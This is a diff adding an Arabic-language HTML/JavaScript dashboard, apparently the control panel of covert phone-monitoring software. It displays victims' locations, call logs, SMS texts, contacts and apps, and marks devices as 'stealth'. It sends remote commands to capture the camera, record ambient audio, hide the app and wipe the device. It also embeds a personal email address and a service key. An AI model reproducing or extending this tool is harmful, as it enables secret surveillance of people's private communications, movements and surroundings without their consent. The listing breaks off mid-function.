@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Admin - Dashboard</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; }
+.hidden { display: none !important; }
+/* Login */
+#loginScreen { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+.login-box { background: #1e293b; padding: 40px; border-radius: 16px; width: 100%; max-width: 400px; border: 1px solid #334155; }
+.login-box h1 { text-align: center; margin-bottom: 8px; font-size: 24px; }
+.login-box p { text-align: center; color: #94a3b8; margin-bottom: 24px; font-size: 14px; }
+.input-group { margin-bottom: 16px; }
+.input-group label { display: block; font-size: 13px; color: #94a3b8; margin-bottom: 6px; }
+.input-group input { width: 100%; padding: 12px 16px; background: #0f172a; border: 1px solid #334155; border-radius: 10px; color: #e2e8f0; font-size: 15px; outline: none; transition: border .2s; }
+.input-group input:focus { border-color: #3b82f6; }
+.btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-size: 15px; cursor: pointer; font-weight: 600; transition: opacity .2s; }
+.btn-primary { background: #3b82f6; color: white; }
+.btn-primary:hover { opacity: .9; }
+.btn-danger { background: #ef4444; color: white; }
+.btn-sm { padding: 6px 14px; font-size: 13px; width: auto; }
+.btn-outline { background: transparent; border: 1px solid #334155; color: #e2e8f0; }
+.btn-outline:hover { background: #1e293b; }
+.error-msg { color: #ef4444; font-size: 13px; text-align: center; margin-top: 12px; }
+.success-msg { color: #22c55e; font-size: 13px; text-align: center; margin-top: 12px; }
+/* App Layout */
+#app { display: flex; height: 100vh; }
+/* Sidebar */
+.sidebar { width: 300px; min-width: 300px; background: #1e293b; border-left: 1px solid #334155; display: flex; flex-direction: column; overflow: hidden; }
+.sidebar-header { padding: 16px 20px; border-bottom: 1px solid #334155; display: flex; align-items: center; justify-content: space-between; }
+.sidebar-header h2 { font-size: 16px; }
+.sidebar-header .badge { background: #3b82f6; color: white; font-size: 11px; padding: 2px 8px; border-radius: 20px; }
+.device-list { flex: 1; overflow-y: auto; padding: 8px; }
+.device-item { padding: 12px 16px; border-radius: 10px; cursor: pointer; transition: background .2s; border: 1px solid transparent; margin-bottom: 4px; }
+.device-item:hover { background: #0f172a; }
+.device-item.active { background: #0f172a; border-color: #3b82f6; }
+.device-item .name { font-size: 14px; font-weight: 600; }
+.device-item .detail { font-size: 12px; color: #94a3b8; margin-top: 2px; }
+.device-item .status { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-left: 8px; }
+.status-online { background: #22c55e; }
+.status-offline { background: #64748b; }
+.status-stealth { background: #f59e0b; }
+/* Main */
+.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+.main-header { padding: 16px 24px; border-bottom: 1px solid #334155; display: flex; align-items: center; justify-content: space-between; }
+.main-header h1 { font-size: 18px; }
+.main-header .user-info { font-size: 13px; color: #94a3b8; }
+.main-content { flex: 1; overflow-y: auto; padding: 24px; }
+/* Empty state */
+.empty-state { text-align: center; padding: 60px 20px; color: #64748b; }
+.empty-state h3 { font-size: 20px; margin-bottom: 8px; }
+.empty-state p { font-size: 14px; }
+/* Tabs */
+.tabs { display: flex; gap: 4px; margin-bottom: 20px; border-bottom: 1px solid #334155; padding-bottom: 0; flex-wrap: wrap; }
+.tab { padding: 8px 16px; font-size: 13px; cursor: pointer; border-radius: 8px 8px 0 0; color: #94a3b8; transition: all .2s; border: none; background: none; }
+.tab:hover { color: #e2e8f0; background: #1e293b; }
+.tab.active { color: #3b82f6; background: #1e293b; font-weight: 600; }
+/* Data Cards */
+.card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; margin-bottom: 12px; }
+.card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
+.card-header h3 { font-size: 14px; color: #94a3b8; }
+.card-value { font-size: 24px; font-weight: 700; }
+.card-sub { font-size: 12px; color: #64748b; margin-top: 2px; }
+.grid-4 { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px; margin-bottom: 20px; }
+/* Table */
+.data-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+.data-table th { text-align: right; padding: 8px 12px; color: #94a3b8; font-weight: 600; border-bottom: 1px solid #334155; }
+.data-table td { padding: 8px 12px; border-bottom: 1px solid #1e293b; }
+.data-table tr:hover td { background: #0f172a; }
+.data-table .encrypted { color: #f59e0b; font-style: italic; font-size: 12px; }
+/* Commands */
+.cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 8px; margin: 16px 0; }
+.cmd-btn { padding: 10px; border: 1px solid #334155; border-radius: 8px; background: #0f172a; color: #e2e8f0; cursor: pointer; font-size: 12px; text-align: center; transition: all .2s; }
+.cmd-btn:hover { border-color: #3b82f6; background: #1e293b; }
+.cmd-btn.danger { border-color: #ef4444; color: #ef4444; }
+.cmd-btn.danger:hover { background: #ef4444; color: white; }
+.cmd-result { background: #0f172a; border: 1px solid #334155; border-radius: 8px; padding: 12px; font-size: 12px; margin-top: 12px; max-height: 200px; overflow-y: auto; white-space: pre-wrap; }
+/* Map placeholder */
+.map-placeholder { background: #1e293b; border: 1px solid #334155; border-radius: 12px; height: 300px; display: flex; align-items: center; justify-content: center; color: #64748b; margin-bottom: 20px; }
+/* Scrollbar */
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+/* Responsive */
+@media (max-width: 768px) {
+  #app { flex-direction: column; }
+  .sidebar { width: 100%; min-width: 100%; max-height: 200px; border-left: none; border-bottom: 1px solid #334155; }
+  .main-content { padding: 16px; }
+  .grid-4 { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
+}
+/* Loading */
+.spinner { width: 20px; height: 20px; border: 2px solid #334155; border-top-color: #3b82f6; border-radius: 50%; animation: spin .6s linear infinite; display: inline-block; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.toast { position: fixed; bottom: 20px; right: 20px; background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 12px 20px; font-size: 14px; z-index: 1000; animation: slideUp .3s ease; box-shadow: 0 4px 20px rgba(0,0,0,.3); }
+@keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+.timestamp { font-size: 11px; color: #64748b; }
+</style>
+</head>
+<body>
+
+<div id="loginScreen">
+  <div class="login-box">
+    <h1>System Admin</h1>
+    <p>دخل بحساب المشرف للتحكم بالأجهزة</p>
+    <div class="input-group">
+      <label>البريد الإلكتروني</label>
+      <input type="email" id="loginEmail" value="muhammad.othman.2005@gmail.com" autocomplete="email">
+    </div>
+    <div class="input-group">
+      <label>كلمة المرور</label>
+      <input type="password" id="loginPassword" placeholder="●●●●●●●●" autocomplete="current-password">
+    </div>
+    <button class="btn btn-primary" onclick="handleLogin()">دخول</button>
+    <div id="loginError" class="error-msg"></div>
+    <div id="setupBox" class="hidden" style="margin-top:16px;padding:12px;background:#0f172a;border-radius:8px;border:1px solid #334155">
+      <p style="font-size:13px;color:#94a3b8;margin-bottom:8px">ما عندك حساب؟ سجل حسابك الأول (مرة واحدة فقط):</p>
+      <input type="password" id="setupPassword" placeholder="كلمة المرور الجديدة" style="width:100%;padding:10px 14px;background:#1e293b;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:14px;margin-bottom:8px">
+      <button class="btn btn-sm btn-primary" onclick="firstTimeSetup()">إنشاء الحساب</button>
+      <div id="setupError" class="error-msg"></div>
+    </div>
+  </div>
+</div>
+
+<div id="app" class="hidden">
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <h2>الأجهزة</h2>
+      <span class="badge" id="deviceCount">0</span>
+    </div>
+    <div class="device-list" id="deviceList"></div>
+    <div style="padding:12px 16px;border-top:1px solid #334155;display:flex;gap:8px">
+      <button class="btn btn-sm btn-outline" onclick="logout()" style="flex:1">تسجيل خروج</button>
+      <button class="btn btn-sm btn-outline" onclick="refreshDevices()">⟳ تحديث</button>
+    </div>
+  </div>
+
+  <!-- Main -->
+  <div class="main">
+    <div class="main-header">
+      <h1 id="mainTitle">اختر جهازاً للتحكم</h1>
+      <span class="user-info" id="userEmail"></span>
+    </div>
+    <div class="main-content" id="mainContent">
+      <div class="empty-state">
+        <h3>لم تختر جهازاً بعد</h3>
+        <p>اختر جهازاً من القائمة الجانبية لعرض بياناته والتحكم به</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const SUPABASE_URL = 'https://accisrkoevfqqiwglswe.supabase.co';
+const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFjY2lzcmtvZXZmcXFpd2dsc3dlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkzMjAzNzQsImV4cCI6MjA5NDg5NjM3NH0.xJWT0Ft5PE3b7F5UZ4DorYLTr3ykM5wU1LVuvt_RuXQ';
+
+let sb;
+let currentUser = null;
+let devices = [];
+let selectedDevice = null;
+let currentTab = 'overview';
+
+function init() {
+  sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
+    auth: { persistSession: true, autoRefreshToken: true, flowType: 'implicit' }
+  });
+  checkSession();
+}
+
+async function checkSession() {
+  const { data: { session } } = await sb.auth.getSession();
+  if (session?.user) {
+    currentUser = session.user;
+    showApp();
+  } else {
+    document.getElementById('loginScreen').classList.remove('hidden');
+  }
+}
+
+async function handleLogin() {
+  const email = document.getElementById('loginEmail').value.trim();
+  const password = document.getElementById('loginPassword').value;
+  const errorEl = document.getElementById('loginError');
+  errorEl.textContent = '';
+  document.getElementById('setupBox').classList.add('hidden');
+
+  if (!email || !password) { errorEl.textContent = 'دخل البريد وكلمة المرور'; return; }
+
+  const { data, error } = await sb.auth.signInWithPassword({ email, password });
+  if (error) {
+    if (error.message.includes('Invalid login credentials')) {
+      errorEl.textContent = 'البريد أو كلمة المرور خطأ. إذا أول مرة، استخدم حقل التسجيل بالأسفل';
+      document.getElementById('setupBox').classList.remove('hidden');
+    } else {
+      errorEl.textContent = error.message;
+    }
+    return;
+  }
+  currentUser = data.user;
+  showApp();
+}
+
+async function firstTimeSetup() {
+  const email = document.getElementById('loginEmail').value.trim();
+  const password = document.getElementById('setupPassword').value;
+  const errorEl = document.getElementById('setupError');
+  errorEl.textContent = '';
+
+  if (!email || !password || password.length < 6) {
+    errorEl.textContent = 'كلمة المرور 6 أحرف على الأقل';
+    return;
+  }
+
+  const { data, error } = await sb.auth.signUp({ email, password });
+  if (error) { errorEl.textContent = error.message; return; }
+
+  // إضافة للمسؤولين (قد تفشل بسبب RLS — عادي)
+  await sb.from('admin_users').insert({ email }).catch(() => {});
+
+  errorEl.className = 'success-msg';
+  errorEl.textContent = '✅ تم إنشاء الحساب! سجل دخول الآن';
+  document.getElementById('setupPassword').value = '';
+}
+
+function logout() {
+  sb.auth.signOut();
+  currentUser = null;
+  devices = [];
+  selectedDevice = null;
+  document.getElementById('app').classList.add('hidden');
+  document.getElementById('loginScreen').classList.remove('hidden');
+  document.getElementById('loginEmail').value = '';
+  document.getElementById('loginPassword').value = '';
+}
+
+function showApp() {
+  document.getElementById('loginScreen').classList.add('hidden');
+  document.getElementById('app').classList.remove('hidden');
+  document.getElementById('userEmail').textContent = currentUser?.email || '';
+  refreshDevices();
+}
+
+async function refreshDevices() {
+  const { data } = await sb
+    .from('devices')
+    .select('*')
+    .order('last_seen_at', { ascending: false });
+  devices = data || [];
+  document.getElementById('deviceCount').textContent = devices.length;
+  renderDeviceList();
+  if (selectedDevice) {
+    const stillExists = devices.find(d => d.device_serial === selectedDevice.device_serial);
+    if (stillExists) {
+      selectedDevice = stillExists;
+      showDeviceDetail(selectedDevice.device_serial);
+    } else {
+      selectedDevice = null;
+      showEmptyState();
+    }
+  }
+}
+
+function renderDeviceList() {
+  const el = document.getElementById('deviceList');
+  el.innerHTML = devices.map(d => {
+    const isOnline = d.last_seen_at && (Date.now() - new Date(d.last_seen_at).getTime()) < 300000;
+    const statusClass = d.is_stealth ? 'status-stealth' : (isOnline ? 'status-online' : 'status-offline');
+    const statusLabel = d.is_stealth ? 'مخفي' : (isOnline ? 'متصل' : 'غير متصل');
+    const active = selectedDevice?.device_serial === d.device_serial ? 'active' : '';
+    return `<div class="device-item ${active}" onclick="showDeviceDetail('${d.device_serial}')">
+      <div><span class="status ${statusClass}"></span><span class="name">${d.device_name || 'Unknown'}</span></div>
+      <div class="detail">${d.manufacturer || ''} ${d.model || ''} · ${d.os_version || ''} · ${statusLabel}</div>
+      <div class="detail">آخر ظهور: ${d.last_seen_at ? new Date(d.last_seen_at).toLocaleString('ar-SA') : 'لم يظهر بعد'}</div>
+    </div>`;
+  }).join('');
+}
+
+function showEmptyState() {
+  document.getElementById('mainTitle').textContent = 'اختر جهازاً للتحكم';
+  document.getElementById('mainContent').innerHTML = `<div class="empty-state">
+    <h3>لم تختر جهازاً بعد</h3>
+    <p>اختر جهازاً من القائمة الجانبية لعرض بياناته والتحكم به</p>
+  </div>`;
+}
+
+async function showDeviceDetail(serial) {
+  selectedDevice = devices.find(d => d.device_serial === serial);
+  if (!selectedDevice) return;
+  renderDeviceList();
+  document.getElementById('mainTitle').textContent = `${selectedDevice.device_name || 'جهاز'} (${selectedDevice.device_serial})`;
+  currentTab = 'overview';
+  await renderTabContent();
+}
+
+async function renderTabContent() {
+  if (!selectedDevice) return;
+  const serial = selectedDevice.device_serial;
+  const tabs = ['overview', 'location', 'calls', 'sms', 'contacts', 'apps', 'state', 'commands'];
+  const tabLabels = { overview: 'ملخص', location: 'الموقع', calls: 'المكالمات', sms: 'الرسائل', contacts: 'جهات الاتصال', apps: 'التطبيقات', state: 'حالة الجهاز', commands: 'أوامر' };
+
+  let tabsHtml = '<div class="tabs">';
+  for (const t of tabs) {
+    tabsHtml += `<button class="tab ${t === currentTab ? 'active' : ''}" onclick="switchTab('${t}')">${tabLabels[t]}</button>`;
+  }
+  tabsHtml += '</div>';
+
+  document.getElementById('mainContent').innerHTML = tabsHtml + '<div id="tabContent"><div class="spinner" style="margin:40px auto"></div></div>';
+
+  await renderTab(currentTab);
+}
+
+function switchTab(tab) {
+  currentTab = tab;
+  renderTabContent();
+}
+
+async function renderTab(tab) {
+  const el = document.getElementById('tabContent');
+  if (!el || !selectedDevice) return;
+
+  switch (tab) {
+    case 'overview': await renderOverview(el); break;
+    case 'location': await renderLocation(el); break;
+    case 'calls': await renderCallLogs(el); break;
+    case 'sms': await renderSms(el); break;
+    case 'contacts': await renderContacts(el); break;
+    case 'apps': await renderApps(el); break;
+    case 'state': await renderDeviceState(el); break;
+    case 'commands': await renderCommands(el); break;
+  }
+}
+
+async function renderOverview(el) {
+  const d = selectedDevice;
+  el.innerHTML = `
+    <div class="grid-4">
+      <div class="card"><div class="card-header"><h3>الحالة</h3></div>
+        <div class="card-value" style="color:${d.is_active ? '#22c55e' : '#ef4444'}">${d.is_active ? 'نشط' : 'موقف'}</div>
+        <div class="card-sub">${d.is_stealth ? 'وضع مخفي' : 'ظاهر'}</div>
+      </div>
+      <div class="card"><div class="card-header"><h3>آخر ظهور</h3></div>
+        <div class="card-value" style="font-size:18px">${d.last_seen_at ? new Date(d.last_seen_at).toLocaleString('ar-SA') : '—'}</div>
+      </div>
+      <div class="card"><div class="card-header"><h3>الجهاز</h3></div>
+        <div style="font-size:14px;line-height:1.8">${d.manufacturer || '—'} ${d.model || ''}<br>${d.os_version || ''}<br>${d.phone_number || '—'}</div>
+      </div>
+      <div class="card"><div class="card-header"><h3>الإجراءات</h3></div>
+        <button class="btn btn-sm btn-primary" onclick="switchTab('commands')" style="margin-bottom:8px">إرسال أمر</button>
+        <button class="btn btn-sm btn-outline" onclick="refreshDevices()">تحديث البيانات</button>
+      </div>
+    </div>
+    <div class="card"><div class="card-header"><h3>معلومات الجهاز</h3></div>
+      <table class="data-table">
+        <tr><td>Device Serial</td><td>${d.device_serial}</td></tr>
+        <tr><td>Device Token</td><td style="font-family:monospace;font-size:11px;color:#94a3b8">${d.device_token ? d.device_token.substring(0, 20) + '...' : '—'}</td></tr>
+        <tr><td>IMEI</td><td>${d.imei || '—'}</td></tr>
+        <tr><td>MAC (WiFi)</td><td>${d.wifi_mac || '—'}</td></tr>
+        <tr><td>MAC (Bluetooth)</td><td>${d.bluetooth_mac || '—'}</td></tr>
+        <tr><td>آخر IP</td><td>${d.last_ip_address || '—'}</td></tr>
+        <tr><td>تاريخ التسجيل</td><td>${d.enrolled_at ? new Date(d.enrolled_at).toLocaleString('ar-SA') : '—'}</td></tr>
+        <tr><td>Admin Lock</td><td>${d.is_admin_locked ? 'نعم' : 'لا'}</td></tr>
+      </table>
+    </div>`;
+}
+
+async function renderLocation(el) {
+  const { data } = await sb.from('location_history').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(100);
+  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في بيانات موقع</p></div>'; return; }
+
+  const last = data[0];
+  el.innerHTML = `
+    <div class="grid-4">
+      <div class="card"><div class="card-header"><h3>آخر موقع</h3></div>
+        <div class="card-value" style="font-size:16px">${last.latitude}, ${last.longitude}</div>
+        <div class="card-sub">${last.accuracy ? 'دقة: ' + Math.round(last.accuracy) + 'm' : ''}</div>
+      </div>
+      <div class="card"><div class="card-header"><h3>الارتفاع</h3></div>
+        <div class="card-value">${last.altitude || 0}m</div>
+      </div>
+      <div class="card"><div class="card-header"><h3>السرعة</h3></div>
+        <div class="card-value">${last.speed ? (last.speed * 3.6).toFixed(1) : 0} km/h</div>
+      </div>
+      <div class="card"><div class="card-header"><h3>آخر تحديث</h3></div>
+        <div class="card-value" style="font-size:14px">${last.captured_at ? new Date(last.captured_at).toLocaleString('ar-SA') : '—'}</div>
+      </div>
+    </div>
+    <div class="map-placeholder">
+      <div style="text-align:center">
+        <div style="font-size:48px;margin-bottom:8px">🗺️</div>
+        <div>${last.latitude}, ${last.longitude}</div>
+        <div style="font-size:12px;margin-top:4px">انسخ الإحداثيات إلى Google Maps</div>
+      </div>
+    </div>
+    <div class="card"><div class="card-header"><h3>سجل المواقع (آخر 100)</h3></div>
+      <table class="data-table">
+        <tr><th>التاريخ</th><th>خط العرض</th><th>خط الطول</th><th>الدقة</th><th>السرعة</th></tr>
+        ${data.slice(0, 20).map(r => `<tr>
+          <td class="timestamp">${r.captured_at ? new Date(r.captured_at).toLocaleString('ar-SA') : '—'}</td>
+          <td>${r.latitude}</td><td>${r.longitude}</td>
+          <td>${r.accuracy ? Math.round(r.accuracy) + 'm' : '—'}</td>
+          <td>${r.speed ? (r.speed * 3.6).toFixed(1) + ' km/h' : '—'}</td>
+        </tr>`).join('')}
+      </table>
+    </div>`;
+}
+
+async function renderCallLogs(el) {
+  const { data } = await sb.from('call_logs').select('*').eq('device_serial', selectedDevice.device_serial).order('call_date', { ascending: false }).limit(100);
+  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في سجل مكالمات</p></div>'; return; }
+  el.innerHTML = `<div class="card"><table class="data-table">
+    <tr><th>التاريخ</th><th>الرقم</th><th>الاسم</th><th>النوع</th><th>المدة</th></tr>
+    ${data.map(r => `<tr>
+      <td class="timestamp">${r.call_date ? new Date(r.call_date).toLocaleString('ar-SA') : '—'}</td>
+      <td class="${r.phone_number && r.phone_number.includes('Encrypted') ? 'encrypted' : ''}">${r.phone_number || '—'}</td>
+      <td class="${r.contact_name && r.contact_name.includes('Encrypted') ? 'encrypted' : ''}">${r.contact_name || '—'}</td>
+      <td>${r.call_type === '1' ? 'وارد' : r.call_type === '2' ? 'صادر' : r.call_type === '3' ? 'فائت' : r.call_type}</td>
+      <td>${r.duration_seconds ? Math.floor(r.duration_seconds / 60) + ':' + (r.duration_seconds % 60).toString().padStart(2, '0') : '—'}</td>
+    </tr>`).join('')}
+  </table></div>`;
+}
+
+async function renderSms(el) {
+  const { data } = await sb.from('sms_messages').select('*').eq('device_serial', selectedDevice.device_serial).order('sms_date', { ascending: false }).limit(100);
+  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في رسائل SMS</p></div>'; return; }
+  el.innerHTML = `<div class="card"><table class="data-table">
+    <tr><th>التاريخ</th><th>الرقم</th><th>النص</th><th>النوع</th></tr>
+    ${data.map(r => `<tr>
+      <td class="timestamp">${r.sms_date ? new Date(r.sms_date).toLocaleString('ar-SA') : '—'}</td>
+      <td class="${r.phone_number && r.phone_number.includes('Encrypted') ? 'encrypted' : ''}">${r.phone_number || '—'}</td>
+      <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" class="${r.message_body && r.message_body.includes('Encrypted') ? 'encrypted' : ''}">${r.message_body || '—'}</td>
+      <td>${r.message_type === '1' ? 'وارد' : r.message_type === '2' ? 'صادر' : r.message_type}</td>
+    </tr>`).join('')}
+  </table></div>`;
+}
+
+async function renderContacts(el) {
+  const { data } = await sb.from('contacts').select('*').eq('device_serial', selectedDevice.device_serial).limit(200);
+  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في جهات اتصال</p></div>'; return; }
+  el.innerHTML = `<div class="card"><div class="card-header"><h3>جهات الاتصال (${data.length})</h3></div>
+    <table class="data-table">
+    <tr><th>الاسم</th><th>الرقم</th><th>البريد</th></tr>
+    ${data.map(r => `<tr>
+      <td class="${r.display_name && r.display_name.includes('Encrypted') ? 'encrypted' : ''}">${r.display_name || '—'}</td>
+      <td class="${r.phone_number && r.phone_number.includes('Encrypted') ? 'encrypted' : ''}">${r.phone_number || '—'}</td>
+      <td>${r.email || '—'}</td>
+    </tr>`).join('')}
+  </table></div>`;
+}
+
+async function renderApps(el) {
+  const { data } = await sb.from('installed_applications').select('*').eq('device_serial', selectedDevice.device_serial).order('app_name').limit(100);
+  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في تطبيقات</p></div>'; return; }
+  el.innerHTML = `<div class="card"><div class="card-header"><h3>التطبيقات المثبتة (${data.length})</h3></div>
+    <table class="data-table">
+    <tr><th>التطبيق</th><th>الحزمة</th><th>الإصدار</th><th>نظامي</th></tr>
+    ${data.map(r => `<tr>
+      <td class="${r.app_name && r.app_name.includes('Encrypted') ? 'encrypted' : ''}">${r.app_name || '—'}</td>
+      <td class="${r.package_name && r.package_name.includes('Encrypted') ? 'encrypted' : ''}" style="font-family:monospace;font-size:11px">${r.package_name || '—'}</td>
+      <td>${r.version_name || ''} (${r.version_code || ''})</td>
+      <td>${r.is_system_app ? 'نعم' : 'لا'}</td>
+    </tr>`).join('')}
+  </table></div>`;
+}
+
+async function renderDeviceState(el) {
+  const { data } = await sb.from('device_state_snapshots').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(50);
+  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في بيانات حالة</p></div>'; return; }
+  const last = data[0];
+  el.innerHTML = `
+    <div class="grid-4">
+      <div class="card"><div class="card-header"><h3>البطارية</h3></div>
+        <div class="card-value">${last.battery_level || 0}%</div>
+        <div class="card-sub">${last.is_charging ? 'يشحن' : 'يفرغ'}</div>
+      </div>
+      <div class="card"><div class="card-header"><h3>الشبكة</h3></div>
+        <div class="card-value" style="font-size:18px">${last.network_type || '—'}</div>
+      </div>
+      <div class="card"><div class="card-header"><h3>التخزين</h3></div>
+        <div class="card-value" style="font-size:16px">${formatBytes(last.storage_available)}</div>
+        <div class="card-sub">من ${formatBytes(last.storage_total)}</div>
+      </div>
+    </div>
+    <div class="card"><div class="card-header"><h3>سجل الحالة</h3></div>
+      <table class="data-table">
+        <tr><th>التاريخ</th><th>البطارية</th><th>الشبكة</th><th>يشحن</th></tr>
+        ${data.slice(0, 20).map(r => `<tr>
+          <td class="timestamp">${r.captured_at ? new Date(r.captured_at).toLocaleString('ar-SA') : '—'}</td>
+          <td>${r.battery_level || 0}%</td>
+          <td>${r.network_type || '—'}</td>
+          <td>${r.is_charging ? 'نعم' : 'لا'}</td>
+        </tr>`).join('')}
+      </table>
+    </div>`;
+}
+
+async function renderCommands(el) {
+  el.innerHTML = `
+    <div class="card"><div class="card-header"><h3>إرسال أمر للجهاز</h3></div>
+    <p style="font-size:13px;color:#94a3b8;margin-bottom:12px">اختر أمراً لتنفيذه على الجهاز عن بعد</p>
+    <div class="cmd-grid">
+      <button class="cmd-btn" onclick="sendCommand('sync_now')">مزامنة فورية</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_location')">التقاط موقع</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_call_logs')">سجل المكالمات</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_sms')">الرسائل SMS</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_contacts')">جهات الاتصال</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_apps')">التطبيقات</button>
+      <button class="cmd-btn" onclick="sendCommand('capture_camera', {camera:'rear'})">تصوير كاميرا</button>
+      <button class="cmd-btn" onclick="sendCommand('record_ambient', {duration:30})">تسجيل صوت (30ث)</button>
+      <button class="cmd-btn" onclick="sendCommand('lock_device')">قفل الجهاز</button>
+      <button class="cmd-btn danger" onclick="confirmWipe()">✕ مسح كلي</button>
+      <button class="cmd-btn" onclick="sendCommand('hide_app')">إخفاء التطبيق</button>
+      <button class="cmd-btn" onclick="sendCommand('unhide_app')">إظهار التطبيق</button>
+      <button class="cmd-btn" onclick="sendCommand('play_sound')">تشغيل صوت</button>
+      <button class="cmd-btn" onclick="sendCommand('send_alert', {title:'تنبيه', message:'تم اكتشاف نشاط مشبوه'})">إرسال تنبيه</button>
+      <button class="cmd-btn" onclick="sendCommand('update_interval', {minutes:1})">تحديث كل دقيقة</button>
+      <button class="cmd-btn" onclick="sendCommand('restart_service')">إعادة تشغيل الخدمة</button>
+    </div>
+    </div>
+    <div id="cmdResult"></div>
+    <div class="card"><div class="card-header"><h3>الأوامر السابقة</h3></div>
+    <div id="prevCommands">جاري التحميل...</div></div>`;
+  loadPrevCommands();
+}
+
+async function sendCommand(command, params = {}) {
+  if (!selectedDevice) { toast('ما في جهاز محدد'); return; }
+  const btn = document.querySelector(`.cmd-btn[onclick*="${command}"]`);
+  if (btn) { btn.textContent = 'جاري...'; btn.style.opacity = '.5'; }
+
+  const { error } = await sb.from('remote_commands').insert({
+    device_serial: selectedDevice.device_serial,
+    command,
+    parameters: JSON.stringify(params),
+    status: 'pending',
+    sent_at: new Date().toISOString()
+  });
+
+  if (btn) setTimeout(() => { btn.textContent = getCmdLabel(command); btn.style.opacity = '1'; }, 2000);
+
+  if (error) {
+    document.getElementById('cmdResult').innerHTML = `<div class="cmd-result" style="color:#ef4444">✕ خطأ: ${error.message}</div>`;
+  } else {
+    document.getElementById('cmdResult').innerHTML = `<div class="cmd-result" style="color:#22c55e">✓ تم إرسال الأمر "${command}" بنجاح</div>`;
+    setTimeout(() => loadPrevCommands(), 1000);
+  }
+}
+
+function getCmdLabel(cmd) {
+  const labels = { sync_now:'مزامنة فورية', capture_location:'التقاط موقع', capture_call_logs:'سجل المكالمات', capture_sms:'الرسائل SMS', capture_contacts:'جهات الاتصال', capture_apps:'التطبيقات', capture_camera:'تصوير كاميرا', record_ambient:'تسجيل صوت (30ث)', lock_device:'قفل الجهاز', hide_app:'إخفاء التطبيق', unhide_app:'إظهار التطبيق', play_sound:'تشغيل صوت', send_alert:'إرسال تنبيه', update_interval:'تحديث كل دقيقة', restart_service:'إعادة تشغيل الخدمة' };
+  return labels[cmd] || cmd;
+}
+
+function confirmWipe() {
+  if (confirm('تحذير: هذا الأمر سيمسح الجهاز بالكامل ولا يمكن التراجع! هل أنت متأكد؟')) {
+    if (confirm('تأكيد نهائي: أنت متأكد من مسح الجهاز؟')) {
+      sendCommand('wipe_device');
+    }
+  }
+}
+
+async function loadPrevCommands() {
+  if (!selectedDevice) return;
+  const { data } = await sb.from('remote_commands').select('*').eq('device_serial', selectedDevice.device_serial).order('sent_at', { ascending: false }).limit(20);
+  const el = document.getElementById('prevCommands');
+  if (!el) return;
+  if (!data || data.length === 0) { el.innerHTML = '<p style="color:#64748b;font-size:13px">ما في أوامر سابقة</p>'; return; }
+  el.innerHTML = `<table class="data-table">
+    <tr><th>التاريخ</th><th>الأمر</th><th>الحالة</th><th>النتيجة</th></tr>
+    ${data.map(r => `<tr>
+      <td class="timestamp">${r.sent_at ? new Date(r.sent_at).toLocaleString('ar-SA') : '—'}</td>
+      <td style="font-family:monospace;font-size:12px">${r.command}</td>
+      <td style="color:${r.status === 'executed' ? '#22c55e' : r.status === 'failed' ? '#ef4444' : '#f59e0b'}">${r.status}</td>
+      <td style="font-size:12px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${r.result || '—'}</td>
+    </tr>`).join('')}
+  </table>`;
+}
+
+function formatBytes(bytes) {
+  if (!bytes || bytes === 0) return '0 B';
+  const k = 1024, sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+}
+
+function toast(msg) {
+  const t = document.createElement('div');
+  t.className = 'toast';
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 3000);
+}
+
+// Auto-refresh كل 15 ثانية
+setInterval(() => {
+  if (currentUser) {
